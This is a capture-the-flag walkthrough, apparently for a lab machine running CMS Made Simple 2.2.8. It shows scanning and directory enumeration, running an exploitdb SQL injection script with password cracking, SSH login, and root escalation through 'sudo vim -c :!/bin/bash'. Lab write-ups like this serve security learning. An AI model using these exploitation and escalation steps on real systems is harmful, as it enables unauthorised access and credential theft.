++ Start Time:         2021-09-22 03:49:16 (GMT5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ "robots.txt" contains 2 entries which should be manually viewed.
++ Server may leak inodes via ETags, header found with file /, inode: 2c39, size: 590523e6dfcd7, mtime: gzip
++ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD 
++ OSVDB-3233: /icons/README: Apache default file found.
+
+
+============================================================================================================================
+
+GOBUSTER:
+=-=-=-=-=-=
+
+───╼ $gobuster dir -u http://10.10.209.25/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt ───╼ 
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.209.25/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/09/22 04:05:33 Starting gobuster in directory enumeration mode
+===============================================================
+/simple               (Status: 301) [Size: 313] [--> http://10.10.209.25/simple/]
+Progress: 12758 / 220561 (5.78%)                                                ^C
+[!] Keyboard interrupt detected, terminating.
+                                                                                 
+===============================================================
+2021/09/22 04:15:02 Finished
+===============================================================
+
+============================================================================================================================
+
+SEARCHING FOR EXPLOIT:
+=-=-=-=-=-=-=-=-=-=-=-=
+
+On Visiting: http://<Machine-IP>/simple
+
+A Simple CMS Service site opens up
+
+one the lower left corner of the page there's mentioned the version of CMS Made Simple
+
+─────────────────────────────────────────────────────────────────────────────────────
+© Copyright 2004 - 2021 - CMS Made Simple
+This site is powered by CMS Made Simple version 2.2.8
+─────────────────────────────────────────────────────────────────────────────────────
+
+We are going to search for possible exploits for this version
+
+For this, first we are going to install searchsploit (command-line tool to search for exploit)
+
+─────────────────────────────────────────────────────────────────────────────────────
+
+sudo git clone https://github.com/offensive-security/exploitdb.git /opt/exploitdb
+
+sudo ln -sf /opt/exploitdb/searchsploit /usr/local/bin/searchsploit
+
+─────────────────────────────────────────────────────────────────────────────────────
+
+We can also search for exploit and CVE on exploitdb
+
+Search: cms made simple
+
+Targetted Result: CMS Made Simple < 2.2.10 - SQL Injection 
+
+Download the Python Code for exploitation
+
+============================================================================================================================
+
+USING PYTHON CODE TO EXPLOIT THE VULNERABILTIY FOUND:
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+Since the code is in python2 so we need to convert it to python3
+
+first install 2to3 library of python
+
+───╼ $pip install 2to3
+
+And then run the following:
+
+───╼ $python3 -m lib2to3 cms_exploit.py -w
+
+now after conversion simply run the following:
+
+───╼ $python3 cms_exploit.py 
+[+] Specify an url target
+[+] Example usage (no cracking password): exploit.py -u http://target-uri
+[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist
+[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.
+
+================================================================
+
+make the following changes on Line 56:
+--------------------------------------
+(FROM) 
+if hashlib.md5(str(salt) + line).hexdigest() == password:
+(TO)
+if hashlib.md5((str(salt) + line).encode('utf-8')).hexdigest() == password:
+
+================================================================
+
+───╼ $python3 cms_exploit3.py -u http://10.10.209.25/simple --crack -w /usr/share/wordlists/rockyou.txt
+
+[+] Salt for password found: 1dac0d92e9fa6bb2
+[+] Username found: mitch
+[+] Email found: admin@admin.com
+[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
+[+] Password cracked: secret
+
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+└──╼ $ssh mitch@10.10.104.245 -p 2222
+The authenticity of host '[10.10.104.245]:2222 ([10.10.104.245]:2222)' can't be established.
+ECDSA key fingerprint is SHA256:Fce5J4GBLgx1+iaSMBjO+NFKOjZvL5LOVF5/jc0kwt8.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.10.104.245]:2222' (ECDSA) to the list of known hosts.
+mitch@10.10.104.245's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+0 packages can be updated.
+0 updates are security updates.
+
+Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
+$ whoami
+mitch
+$ ls
+user.txt
+$ cat user.txt	
+G00d j0b, keep up!
+$ cd ..
+$ ls
+mitch  sunbath
+$ sudo -l
+User mitch may run the following commands on Machine:
+    (root) NOPASSWD: /usr/bin/vim
+$ sudo vim -c ':!/bin/bash'
+root@Machine:/home# id
+uid=0(root) gid=0(root) groups=0(root)
+root@Machine:/home# cd ..
+root@Machine:/# ls
+bin   cdrom  etc   initrd.img      lib         media  opt   root  sbin  srv  tmp  var      vmlinuz.old
+boot  dev    home  initrd.img.old  lost+found  mnt    proc  run   snap  sys  usr  vmlinuz
+root@Machine:/# cd root/
+root@Machine:/root# ls
+root.txt
+root@Machine:/root# cat root.txt 
+W3ll d0n3. You made it!
+root@Machine:/root# 
+
+
+
+
+
+
+
